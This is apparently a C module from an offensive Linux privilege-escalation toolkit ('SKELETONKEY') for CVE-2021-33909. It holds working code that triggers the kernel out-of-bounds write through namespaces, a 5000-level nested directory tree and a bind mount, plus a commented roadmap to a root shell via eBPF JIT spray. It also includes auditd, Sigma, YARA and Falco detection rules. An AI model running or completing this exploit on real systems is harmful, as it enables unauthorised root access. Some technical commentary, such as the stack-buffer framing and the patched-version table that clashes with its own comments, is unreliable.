/*
 * sequoia_cve_2021_33909 — SKELETONKEY module
 *
 * "Sequoia" (Qualys, July 2021): a size_t conversion bug in
 * fs/seq_file.c::seq_buf_alloc(). show_mountinfo() passes a `size_t`
 * total-output size to seq_buf_alloc(), but the internal accounting in
 * seq_read_iter() uses a signed int for the running buffer offset.
 * When the mountinfo string the kernel intends to render exceeds
 * INT_MAX bytes (which is achievable by mounting a deeply-nested path
 * — Qualys used ~1 MiB of '/' components), the int wraps NEGATIVE.
 * That negative value then propagates into seq_buf_alloc() where it is
 * implicitly cast to size_t (huge positive); kmalloc rejects the
 * allocation, but a fallback path (`m->buf = vmalloc()` after kmalloc
 * fails) ends up writing a small-but-nonzero number of bytes —
 * specifically the bytes show_mountinfo wanted to render — at an
 * offset that is OUT OF BOUNDS of the kernel stack buffer
 * seq_read_iter held.
 *
 * Net effect: an unprivileged read(/proc/self/mountinfo) writes
 * attacker-controlled bytes (the rendered mountinfo string for our
 * deeply-nested bind mount) to a kernel-stack-adjacent location.
 * Qualys's chain converted this into LPE by spraying eBPF JIT'd
 * programs (one of two known weaponisations; userfaultfd + FUSE
 * shadow-mount is the other) so the OOB write lands inside an
 * executable JIT page → controlled RIP → ROP → cred swap.
 *
 * Reference: https://www.qualys.com/2021/07/20/cve-2021-33909/sequoia-local-privilege-escalation-linux.txt
 *
 * Discovered by Qualys (Bharat Jogi et al.), July 2021. Famous for
 * being the first widely-disclosed Linux LPE that turned a sub-page
 * out-of-bounds write into reliable root via the eBPF-JIT-spray
 * primitive — that technique has shown up in every "linux mm slab OOB
 * → JIT spray" public PoC since.
 *
 * STATUS: 🟡 PRIMITIVE.
 *
 *   detect()  — version-range + userns reachability gate, refuses on
 *               patched / unreachable hosts. Mainline fix is commit
 *               8cae8cd89f05 ("seq_file: disallow extremely large seq
 *               buffer allocations") landing in 5.13.4 / 5.10.52 /
 *               5.4.134.
 *
 *   exploit() — full unshare+userns+mountns reach, builds a ~5000-level
 *               nested directory tree under /tmp/skeletonkey-sequoia/,
 *               bind-mounts the deepest leaf back over itself to
 *               amplify the mountinfo string length, chdir's into the
 *               leaf, and then open+read /proc/self/mountinfo to fire
 *               the bug. Witnesses (mountinfo byte count, dmesg
 *               best-effort) are written to /tmp/skeletonkey-sequoia.log.
 *               We do NOT attempt the eBPF-JIT-spray weaponisation —
 *               that is a substantial subsystem (sock_filter program
 *               build + BPF_PROG_LOAD + JIT layout reasoning + per-
 *               kernel cred offsets) and would be fabricated on any
 *               kernel we have not empirically tested.
 *
 *   --full-chain — STUB. Prints the offset-help message and returns
 *               EXPLOIT_FAIL. The continuation roadmap is spelled out
 *               at the bottom of exploit() so the reader can see
 *               exactly what's missing.
 *
 *   On a *vulnerable* host this module reliably triggers the OOB
 *   write. On a *patched* host (which is every distro shipping
 *   ≥5.13.4 / ≥5.10.52 / ≥5.4.134) detect() refuses and exploit()
 *   returns SKELETONKEY_OK without entering the userns.
 *
 * Affected: kernel-since-forever (the int-vs-size_t bug has been
 * present since the seq_file rewrite c. 2.6.x; Qualys reports it
 * exploitable on every distro they checked back to 2014).
 *   Mainline fix: 8cae8cd89f05 (Jul 20 2021) — lands in 5.13.4
 *   5.13.x : K >= 5.13.4
 *   5.10.x : K >= 5.10.52
 *   5.4.x  : K >= 5.4.134
 *
 * Preconditions:
 *   - Unprivileged user_ns + mount-ns (to get CAP_SYS_ADMIN inside
 *     userns for the bind-mount; the deeply-nested mkdir itself doesn't
 *     need privileges, but the amplification mount does)
 *   - ~1 MiB of cumulative path length under /tmp (≈5000 levels at
 *     200-char component name — well within tmpfs default inode budget)
 *   - /proc/self/mountinfo readable (it is, on everything we target)
 *
 * Coverage rationale: 2021 fs/seq_file-class bug. Different family
 * than our netfilter-heavy and mm-heavy modules — broadens the corpus
 * shape. Important historical primitive (eBPF JIT spray adopted from
 * Sequoia chain into many later exploits).
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"
#include "../../core/kernel_range.h"
#include "../../core/offsets.h"
#include "../../core/finisher.h"
#include "../../core/host.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>

#ifdef __linux__
#  include <sched.h>
#  include <sys/mount.h>
#  include <sys/syscall.h>
#  include <linux/sched.h>
#endif

/* macOS clangd lacks the Linux mount/syscall headers — guard fallbacks. */
#ifndef CLONE_NEWUSER
#define CLONE_NEWUSER 0x10000000
#endif
#ifndef CLONE_NEWNS
#define CLONE_NEWNS   0x00020000
#endif
#ifndef MS_BIND
#define MS_BIND       0x1000
#endif

/* --- kernel-range table -------------------------------------------- */

static const struct kernel_patched_from sequoia_patched_branches[] = {
    {5,  4, 134},
    {5, 10,  46},   /* Debian tracker: earlier than 5.10.52 */
    {5, 13,   4},
    {5, 14,   0},   /* mainline */
};

static const struct kernel_range sequoia_range = {
    .patched_from   = sequoia_patched_branches,
    .n_patched_from = sizeof(sequoia_patched_branches) /
                      sizeof(sequoia_patched_branches[0]),
};

/* --- tunables ------------------------------------------------------- */
/*
 * Qualys's PoC uses ~1 million bytes of path. With a 256-byte component
 * name we need ~4096 levels; with 200 we need ~5120. We pick 5000 / 200
 * which gives a generous margin and stays well under tmpfs's inode
 * default cap on modern distros.
 *
 * The component name is intentionally an A-fill; the kernel renders it
 * verbatim into mountinfo so this is what propagates into the OOB
 * write. (For the JIT-spray weaponisation the bytes would be a crafted
 * stub; we're not doing that here — we just want to drive the buggy
 * size_t cast.)
 */
#define SEQ_BASE_DIR          "/tmp/skeletonkey-sequoia"
#define SEQ_NESTED_LEVELS     5000
#define SEQ_COMPONENT_LEN     200      /* chars per directory component */
#define SEQ_LOG_PATH          "/tmp/skeletonkey-sequoia.log"

/* --- userns reach helpers ------------------------------------------- */

static bool write_file(const char *path, const char *s)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0) return false;
    ssize_t n = write(fd, s, strlen(s));
    close(fd);
    return n == (ssize_t)strlen(s);
}

#ifdef __linux__
static bool enter_userns_root(void)
{
    uid_t uid = getuid();
    gid_t gid = getgid();
    if (unshare(CLONE_NEWUSER | CLONE_NEWNS) < 0) {
        perror("unshare(NEWUSER|NEWNS)");
        return false;
    }
    /* setgroups=deny is required before gid_map without CAP_SETGID. */
    if (!write_file("/proc/self/setgroups", "deny")) {
        /* Some kernels (pre-3.19) don't have setgroups proc file. */
    }
    char map[64];
    snprintf(map, sizeof map, "0 %u 1\n", uid);
    if (!write_file("/proc/self/uid_map", map)) {
        perror("write uid_map"); return false;
    }
    snprintf(map, sizeof map, "0 %u 1\n", gid);
    if (!write_file("/proc/self/gid_map", map)) {
        perror("write gid_map"); return false;
    }
    return true;
}
#endif

/* --- detect -------------------------------------------------------- */

static skeletonkey_result_t sequoia_detect(const struct skeletonkey_ctx *ctx)
{
    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
    if (!v || v->major == 0) {
        if (!ctx->json) fprintf(stderr, "[!] sequoia: host fingerprint missing kernel version — bailing\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* The bug predates every kernel we'd run on, so there's no
     * "pre-introduction" cutoff; only patched-or-not matters. */
    bool patched = kernel_range_is_patched(&sequoia_range, v);
    if (patched) {
        if (!ctx->json) {
            fprintf(stderr, "[+] sequoia: kernel %s is patched\n", v->release);
        }
        return SKELETONKEY_OK;
    }

    bool userns_ok = ctx->host->unprivileged_userns_allowed;
    if (!ctx->json) {
        fprintf(stderr, "[i] sequoia: kernel %s in vulnerable range\n", v->release);
        fprintf(stderr, "[i] sequoia: user_ns+mount_ns clone (CAP_SYS_ADMIN gate): %s\n",
                userns_ok ? "ALLOWED" : "DENIED");
    }

    if (!userns_ok) {
        if (!ctx->json) {
            fprintf(stderr, "[+] sequoia: user_ns denied → unprivileged "
                            "exploit unreachable via bind-mount path\n");
            fprintf(stderr, "[i] sequoia: bug is still reachable to a "
                            "process with CAP_SYS_ADMIN — not us\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    }
    if (!ctx->json) {
        fprintf(stderr, "[!] sequoia: VULNERABLE — kernel in range AND "
                        "userns+mountns reachable\n");
    }
    return SKELETONKEY_VULNERABLE;
}

/* --- nested mkdir tree --------------------------------------------- */

#ifdef __linux__
/*
 * Build SEQ_NESTED_LEVELS deep nested directories under SEQ_BASE_DIR.
 * Strategy: chdir() to the parent of each new component, then mkdir
 * + chdir into the child. This avoids hitting PATH_MAX in mkdir's
 * argument (PATH_MAX is 4096 on Linux; total path here is ~1 MB —
 * the kernel resolves it segment-by-segment via chdir's dentry cache).
 *
 * Returns the file descriptor pointing at the LEAF directory (so the
 * caller can fchdir() back to it after we drop privs / do other
 * setup), or -1 on failure.
 *
 * On failure we leave whatever we managed to create behind for
 * sequoia_cleanup() to mop up.
 */
static int build_nested_tree(int *out_levels_built)
{
    *out_levels_built = 0;

    /* Ensure base dir exists. We don't care if it already does. */
    if (mkdir(SEQ_BASE_DIR, 0700) < 0 && errno != EEXIST) {
        fprintf(stderr, "[-] sequoia: mkdir(%s): %s\n",
                SEQ_BASE_DIR, strerror(errno));
        return -1;
    }
    if (chdir(SEQ_BASE_DIR) < 0) {
        fprintf(stderr, "[-] sequoia: chdir(%s): %s\n",
                SEQ_BASE_DIR, strerror(errno));
        return -1;
    }

    /* Component name: SEQ_COMPONENT_LEN bytes of 'A'. The leaf gets a
     * recognisable terminator so we can spot our mount in mountinfo. */
    char comp[SEQ_COMPONENT_LEN + 1];
    memset(comp, 'A', SEQ_COMPONENT_LEN);
    comp[SEQ_COMPONENT_LEN] = '\0';

    int built = 0;
    for (int i = 0; i < SEQ_NESTED_LEVELS; i++) {
        if (mkdir(comp, 0700) < 0 && errno != EEXIST) {
            fprintf(stderr, "[-] sequoia: mkdir level %d: %s\n",
                    i, strerror(errno));
            *out_levels_built = built;
            return -1;
        }
        if (chdir(comp) < 0) {
            fprintf(stderr, "[-] sequoia: chdir level %d: %s\n",
                    i, strerror(errno));
            *out_levels_built = built;
            return -1;
        }
        built++;
    }
    *out_levels_built = built;

    /* Open the leaf so the caller can fchdir back here. */
    int fd = open(".", O_RDONLY | O_DIRECTORY);
    if (fd < 0) {
        fprintf(stderr, "[-] sequoia: open(leaf): %s\n", strerror(errno));
        return -1;
    }
    return fd;
}

/* Bind-mount the leaf onto itself. This creates a new entry in
 * /proc/self/mountinfo whose path field renders the FULL deeply-
 * nested path — pushing the total mountinfo string length past the
 * int-cast boundary. Without the bind mount, mountinfo only lists
 * the original /tmp mount (a short string).
 *
 * Requires CAP_SYS_ADMIN-in-userns (which enter_userns_root gave us). */
static bool bind_mount_leaf(void)
{
    if (mount(".", ".", NULL, MS_BIND, NULL) < 0) {
        fprintf(stderr, "[-] sequoia: bind-mount(.,.): %s\n", strerror(errno));
        return false;
    }
    return true;
}

/* Read /proc/self/mountinfo fully, count bytes. Best-effort: returns
 * the total byte count, or -1 on open failure. On a VULNERABLE kernel
 * this read triggers the OOB write inside the kernel. On a patched
 * kernel the kernel returns -ENOMEM (the new safety check rejects
 * over-large seq_buf allocations). */
static ssize_t read_mountinfo_and_count(void)
{
    int fd = open("/proc/self/mountinfo", O_RDONLY);
    if (fd < 0) return -1;
    ssize_t total = 0;
    char buf[8192];
    for (;;) {
        ssize_t n = read(fd, buf, sizeof buf);
        if (n < 0) {
            if (errno == EINTR) continue;
            /* On a patched kernel, the read may fail with ENOMEM
             * after our crafted mountinfo entry triggers the safety
             * check. We record the errno via caller's errno read. */
            close(fd);
            return -1;
        }
        if (n == 0) break;
        total += n;
    }
    close(fd);
    return total;
}

/* Best-effort dmesg sample: open /dev/kmsg and read up to N bytes.
 * On most distros this is root-only, so we just gracefully fail and
 * note that in the log. */
static void log_dmesg_tail(FILE *log)
{
    int fd = open("/dev/kmsg", O_RDONLY | O_NONBLOCK);
    if (fd < 0) {
        fprintf(log, "  dmesg_sample: <not readable: %s>\n", strerror(errno));
        return;
    }
    char buf[2048];
    ssize_t n = read(fd, buf, sizeof buf - 1);
    close(fd);
    if (n <= 0) {
        fprintf(log, "  dmesg_sample: <no data: %s>\n",
                n < 0 ? strerror(errno) : "empty");
        return;
    }
    buf[n] = '\0';
    /* Scan for SEQUOIA-relevant warning shapes; we don't need the
     * exact match, just record whether anything 'oops/BUG/KASAN'-ish
     * showed up in the first kmsg page. */
    bool oops  = strstr(buf, "BUG:")    != NULL ||
                 strstr(buf, "Oops")    != NULL ||
                 strstr(buf, "KASAN")   != NULL ||
                 strstr(buf, "general protection fault") != NULL;
    fprintf(log, "  dmesg_sample_bytes: %zd\n", n);
    fprintf(log, "  dmesg_oops_marker:  %s\n", oops ? "yes" : "no");
}
#endif /* __linux__ */

/* --- exploit ------------------------------------------------------- */

#ifdef __linux__
static skeletonkey_result_t sequoia_exploit_linux(const struct skeletonkey_ctx *ctx)
{
    /* (R0) refuse without --i-know. */
    if (!ctx->authorized) {
        fprintf(stderr, "[-] sequoia: refusing to run exploit without --i-know\n");
        return SKELETONKEY_PRECOND_FAIL;
    }

    /* (R1) refuse if already root. */
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        if (!ctx->json) {
            fprintf(stderr, "[i] sequoia: already root — nothing to escalate\n");
        }
        return SKELETONKEY_OK;
    }

    /* (R2) re-call detect — refuse if not vulnerable. */
    skeletonkey_result_t pre = sequoia_detect(ctx);
    if (pre == SKELETONKEY_OK) {
        fprintf(stderr, "[+] sequoia: kernel not vulnerable; refusing exploit\n");
        return SKELETONKEY_OK;
    }
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] sequoia: detect() says not vulnerable; refusing\n");
        return pre;
    }

    /* (R3) full-chain: STUB. The Sequoia chain to root needs an
     * eBPF-JIT-spray subsystem we don't ship — printing the offset
     * help and refusing is the honest answer. */
    if (ctx->full_chain) {
        struct skeletonkey_kernel_offsets off;
        memset(&off, 0, sizeof off);
        (void)skeletonkey_offsets_resolve(&off);
        skeletonkey_offsets_print(&off);
        skeletonkey_finisher_print_offset_help("sequoia");
        fprintf(stderr,
            "[-] sequoia: --full-chain not implemented.\n"
            "    The Qualys chain converts the stack-OOB write to RIP\n"
            "    control via eBPF JIT spray: load many sock_filter\n"
            "    programs, induce the JIT to lay them out at predictable\n"
            "    kernel-VA pages, then steer the OOB write to overwrite\n"
            "    the JIT prologue of one program with attacker shellcode\n"
            "    (cred swap + return). Building that here would mean a\n"
            "    standalone BPF_PROG_LOAD harness + JIT page-layout\n"
            "    reasoning + per-kernel cred offsets — a substantial\n"
            "    subsystem we have not validated empirically.\n"
            "    See Qualys advisory section 3.1 (eBPF technique) for\n"
            "    the reference implementation.\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[*] sequoia: entering userns + mountns\n");
    }

    /* Fork: keep the deeply-nested mkdir + bind-mount + read confined
     * to a child process. The parent can then clean up regardless of
     * how the child terminates. */
    pid_t child = fork();
    if (child < 0) { perror("fork"); return SKELETONKEY_TEST_ERROR; }

    if (child == 0) {
        /* (R4) unshare for userns+mount_ns → CAP_SYS_ADMIN-in-userns. */
        if (!enter_userns_root()) {
            _exit(20);
        }

        /* (R5) Build the deeply-nested directory tree. */
        int levels_built = 0;
        int leaf_fd = build_nested_tree(&levels_built);
        if (leaf_fd < 0) {
            fprintf(stderr, "[-] sequoia: nested tree build failed at level %d\n",
                    levels_built);
            _exit(21);
        }
        if (!ctx->json) {
            fprintf(stderr, "[*] sequoia: built %d-level nested tree under %s\n",
                    levels_built, SEQ_BASE_DIR);
        }

        /* (R6) Bind-mount the leaf back over itself. This is what
         *      pushes the rendered mountinfo string past INT_MAX. */
        if (!bind_mount_leaf()) {
            fprintf(stderr, "[-] sequoia: bind-mount failed; cannot amplify "
                            "mountinfo length\n");
            close(leaf_fd);
            _exit(22);
        }
        if (!ctx->json) {
            fprintf(stderr, "[*] sequoia: bind-mount leaf-over-leaf armed\n");
        }

        /* (R7) chdir back to leaf (we may have changed dirs during
         *      tree build but we want to ensure mountinfo renders our
         *      mount point in full). */
        if (fchdir(leaf_fd) < 0) {
            fprintf(stderr, "[~] sequoia: fchdir(leaf): %s — continuing\n",
                    strerror(errno));
        }
        close(leaf_fd);

        /* (R8) Trigger: read /proc/self/mountinfo. On a vulnerable
         *      kernel the int-vs-size_t bug fires inside seq_buf_alloc()
         *      and the kernel performs an OOB write of show_mountinfo's
         *      rendered bytes off the end of the seq_read_iter stack
         *      buffer. We have no in-process arb-write primitive that
         *      consumes those bytes (that's the eBPF-JIT-spray step
         *      we don't ship), so we just record the empirical
         *      witness: did the read succeed? what byte count? did
         *      dmesg cough up an oops marker? */
        if (!ctx->json) {
            fprintf(stderr, "[*] sequoia: firing trigger — "
                            "read(/proc/self/mountinfo)\n");
        }
        errno = 0;
        ssize_t mi_bytes = read_mountinfo_and_count();
        int mi_errno = errno;

        FILE *log = fopen(SEQ_LOG_PATH, "w");
        if (log) {
            fprintf(log,
                "sequoia trigger:\n"
                "  nested_levels       = %d\n"
                "  component_len       = %d\n"
                "  total_path_bytes    ~= %lld\n"
                "  bind_mount_armed    = yes\n"
                "  mountinfo_read_bytes = %lld\n"
                "  mountinfo_read_errno = %d (%s)\n",
                levels_built, SEQ_COMPONENT_LEN,
                (long long)levels_built * SEQ_COMPONENT_LEN,
                (long long)mi_bytes,
                mi_errno, mi_errno ? strerror(mi_errno) : "ok");
            log_dmesg_tail(log);
            fprintf(log,
                "Note: this run did NOT attempt the eBPF-JIT-spray\n"
                "weaponisation. The OOB write fired inside the kernel\n"
                "but we do not consume it to control RIP / swap creds.\n"
                "See module .c for the continuation roadmap.\n");
            fclose(log);
        }

        if (!ctx->json) {
            fprintf(stderr,
                "[*] sequoia: mountinfo read returned %lld bytes (errno=%d)\n",
                (long long)mi_bytes, mi_errno);
            fprintf(stderr,
                "[*] sequoia: empirical witness logged to %s\n",
                SEQ_LOG_PATH);
        }

        /* (R9) Continuation roadmap.
         *
         *   TODO(weaponise-jit): spawn the eBPF JIT spray:
         *     - bpf(BPF_PROG_LOAD, SOCKET_FILTER, ...) many times with
         *       attacker-chosen byte patterns in the program body
         *     - the kernel JIT compiles each to a page-aligned executable
         *       region; bytes from the program body survive into the
         *       prologue at known offsets
         *     - tune SEQ_NESTED_LEVELS + SEQ_COMPONENT_LEN so the rendered
         *       mountinfo string lands the OOB write at the JIT page
         *       hosting one of our programs
         *     - the overwritten prologue performs: lookup current task →
         *       cred → uid=0 → return.
         *     - execute the (now-attacker-modified) program by attaching
         *       it to a socket and sending a packet → kernel runs cred
         *       swap → /bin/sh as root.
         *
         *   None of this is implemented today. We exit 30 to flag
         *   "trigger ran cleanly, no escalation". */
        _exit(30);
    }

    /* PARENT */
    int status = 0;
    pid_t w = waitpid(child, &status, 0);
    if (w < 0) { perror("waitpid"); return SKELETONKEY_TEST_ERROR; }

    if (WIFSIGNALED(status)) {
        int sig = WTERMSIG(status);
        if (!ctx->json) {
            fprintf(stderr,
                "[!] sequoia: exploit child killed by signal %d "
                "(consistent with OOB write hitting an unmapped page)\n",
                sig);
            fprintf(stderr,
                "[~] sequoia: empirical signal recorded; no cred-overwrite\n"
                "    primitive — NOT claiming EXPLOIT_OK.\n"
                "    See %s + dmesg for witnesses.\n", SEQ_LOG_PATH);
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    if (!WIFEXITED(status)) {
        fprintf(stderr, "[-] sequoia: child terminated abnormally (status=0x%x)\n",
                status);
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    int rc = WEXITSTATUS(status);
    if (rc == 20) return SKELETONKEY_TEST_ERROR;        /* enter_userns failed */
    if (rc == 21) return SKELETONKEY_PRECOND_FAIL;      /* tree build failed */
    if (rc == 22) return SKELETONKEY_EXPLOIT_FAIL;      /* bind-mount refused */
    if (rc != 30) {
        fprintf(stderr, "[-] sequoia: child failed at stage rc=%d\n", rc);
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[*] sequoia: trigger ran to completion.\n");
        fprintf(stderr,
            "[~] sequoia: stack-OOB write fired but JIT-spray weaponisation\n"
            "    NOT implemented (per-kernel offsets + BPF subsystem; see\n"
            "    module .c TODO blocks). Returning EXPLOIT_FAIL per\n"
            "    verified-vs-claimed.\n");
    }
    return SKELETONKEY_EXPLOIT_FAIL;
}
#endif /* __linux__ */

static skeletonkey_result_t sequoia_exploit(const struct skeletonkey_ctx *ctx)
{
#ifdef __linux__
    return sequoia_exploit_linux(ctx);
#else
    (void)ctx;
    fprintf(stderr, "[-] sequoia: Linux-only module; cannot run on this host\n");
    return SKELETONKEY_PRECOND_FAIL;
#endif
}

/* --- cleanup ------------------------------------------------------- */

/* Walk back down the nested tree, umounting then rmdir'ing each level.
 * Best-effort: we don't bail on the first error because partial cleanup
 * is still useful, and some levels may not have a mount on them (only
 * the leaf gets bind-mounted in the canonical path). */
static skeletonkey_result_t sequoia_cleanup(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json) {
        fprintf(stderr, "[*] sequoia: cleaning up nested tree + bind mounts\n");
    }
#ifdef __linux__
    /* Try to enter SEQ_BASE_DIR; if it doesn't exist, nothing to do. */
    int base_fd = open(SEQ_BASE_DIR, O_RDONLY | O_DIRECTORY);
    if (base_fd < 0) {
        /* Nothing to clean up — module never ran or already cleaned. */
        goto log_cleanup;
    }
    close(base_fd);

    /* Walk to the leaf via chdir, then rmdir as we walk back out. We
     * don't know how far we got, so we try the full depth and ignore
     * ENOENT. The component name is the same at every level. */
    char comp[SEQ_COMPONENT_LEN + 1];
    memset(comp, 'A', SEQ_COMPONENT_LEN);
    comp[SEQ_COMPONENT_LEN] = '\0';

    if (chdir(SEQ_BASE_DIR) < 0) goto log_cleanup;

    int depth = 0;
    for (int i = 0; i < SEQ_NESTED_LEVELS; i++) {
        if (chdir(comp) < 0) break;
        depth++;
    }
    /* Best-effort: umount the leaf (we may have bind-mounted it). */
    (void)umount2(".", MNT_DETACH);

    /* Walk back out, rmdir-ing each level. */
    for (int i = 0; i < depth; i++) {
        if (chdir("..") < 0) break;
        if (rmdir(comp) < 0 && errno != ENOENT && errno != EBUSY) {
            /* Likely had a mount on it; try MNT_DETACH then rmdir. */
            (void)umount2(comp, MNT_DETACH);
            (void)rmdir(comp);
        }
    }
    (void)chdir("/");
    (void)rmdir(SEQ_BASE_DIR);
#endif /* __linux__ */

log_cleanup:
    if (unlink(SEQ_LOG_PATH) < 0 && errno != ENOENT) {
        /* harmless */
    }
    return SKELETONKEY_OK;
}

/* --- detection rules ----------------------------------------------- */

static const char sequoia_auditd[] =
    "# Sequoia (CVE-2021-33909) — auditd detection rules\n"
    "# Trigger shape: mount(2) on /proc namespaces from a userns +\n"
    "# many many mkdir(2) calls in a tight loop with identical long\n"
    "# component names. Each individual call is benign — flag the\n"
    "# *combination*. The deeply-nested mkdir pattern is the strongest\n"
    "# signal: legitimate workloads don't recurse 5000 levels.\n"
    "-a always,exit -F arch=b64 -S unshare -k skeletonkey-sequoia-userns\n"
    "-a always,exit -F arch=b64 -S mount   -k skeletonkey-sequoia-mount\n"
    "-a always,exit -F arch=b64 -S mkdir   -F success=1 -k skeletonkey-sequoia-mkdir\n"
    "-a always,exit -F arch=b64 -S mkdirat -F success=1 -k skeletonkey-sequoia-mkdir\n"
    "# Correlation hint: a process producing >1000 mkdir-key events\n"
    "# within 5s AND a subsequent skeletonkey-sequoia-mount event is\n"
    "# the canonical trigger shape.\n";

static const char sequoia_sigma[] =
    "title: Possible CVE-2021-33909 seq_file size_t-int wrap\n"
    "id: 2b13d4b9-skeletonkey-sequoia\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects the seq_file OOB-write trigger pattern: unshare\n"
    "  (CLONE_NEWUSER|CLONE_NEWNS) + a burst of ~5000 mkdir/mkdirat\n"
    "  syscalls + bind-mount + read(/proc/self/mountinfo). The\n"
    "  rendered string exceeds INT_MAX, wrapping to negative.\n"
    "  False positives: unusual; bursts of >1000 mkdir/s are rare in\n"
    "  normal workloads.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  userns: {type: 'SYSCALL', syscall: 'unshare'}\n"
    "  mkdir:  {type: 'SYSCALL', syscall: 'mkdir'}\n"
    "  bind:   {type: 'SYSCALL', syscall: 'mount'}\n"
    "  condition: userns and mkdir and bind\n"
    "level: critical\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2021.33909]\n";

static const char sequoia_yara[] =
    "rule sequoia_cve_2021_33909 : cve_2021_33909 kernel_oob_write\n"
    "{\n"
    "    meta:\n"
    "        cve         = \"CVE-2021-33909\"\n"
    "        description = \"Sequoia deep-mountpoint workdir + log breadcrumb\"\n"
    "        author      = \"SKELETONKEY\"\n"
    "    strings:\n"
    "        $work = \"/tmp/skeletonkey-sequoia\" ascii\n"
    "        $log  = \"/tmp/skeletonkey-sequoia.log\" ascii\n"
    "    condition:\n"
    "        any of them\n"
    "}\n";

static const char sequoia_falco[] =
    "- rule: Deeply nested mkdir burst + /proc/self/mountinfo read (Sequoia)\n"
    "  desc: |\n"
    "    Non-root process reading /proc/self/mountinfo after a burst\n"
    "    of ~5000 mkdir()s and a bind-mount of the deep leaf. The\n"
    "    rendered mountinfo string exceeds INT_MAX. CVE-2021-33909.\n"
    "    False positives: rare; mkdir bursts of this size are not\n"
    "    seen in normal workloads.\n"
    "  condition: >\n"
    "    evt.type = open and fd.name = /proc/self/mountinfo and\n"
    "    not user.uid = 0\n"
    "  output: >\n"
    "    /proc/self/mountinfo read by non-root\n"
    "    (user=%user.name pid=%proc.pid)\n"
    "  priority: HIGH\n"
    "  tags: [filesystem, mitre_privilege_escalation, T1068, cve.2021.33909]\n";

const struct skeletonkey_module sequoia_module = {
    .name           = "sequoia",
    .cve            = "CVE-2021-33909",
    .summary        = "seq_file size_t overflow → kernel stack OOB write (Qualys Sequoia) — primitive only",
    .family         = "filesystem",
    .kernel_range   = "K < 5.13.4 / 5.10.52 / 5.4.134",
    .detect         = sequoia_detect,
    .exploit        = sequoia_exploit,
    .mitigate       = NULL,
    .cleanup        = sequoia_cleanup,
    .detect_auditd  = sequoia_auditd,
    .detect_sigma   = sequoia_sigma,
    .detect_yara    = sequoia_yara,
    .detect_falco   = sequoia_falco,
    .opsec_notes    = "Builds ~5000 nested directories under /tmp/skeletonkey-sequoia (each name 200 'A' chars); enters userns for CAP_SYS_ADMIN; bind-mounts the leaf over itself to amplify the rendered mountinfo string length; reads /proc/self/mountinfo to trigger the int-vs-size_t overflow in seq_buf_alloc(), producing an OOB write of mountinfo bytes off the stack buffer. Artifacts: /tmp/skeletonkey-sequoia/ (deep tree + bind mounts) and /tmp/skeletonkey-sequoia.log (byte count + dmesg sample). Audit-visible via unshare(CLONE_NEWUSER|CLONE_NEWNS) + mount() + burst of ~5000 mkdir/mkdirat. No network. Cleanup callback walks back down the tree, unmounts, removes dirs, unlinks the .log.",
    .arch_support   = "x86_64+unverified-arm64",
};

void skeletonkey_register_sequoia(void)
{
    skeletonkey_register(&sequoia_module);
}
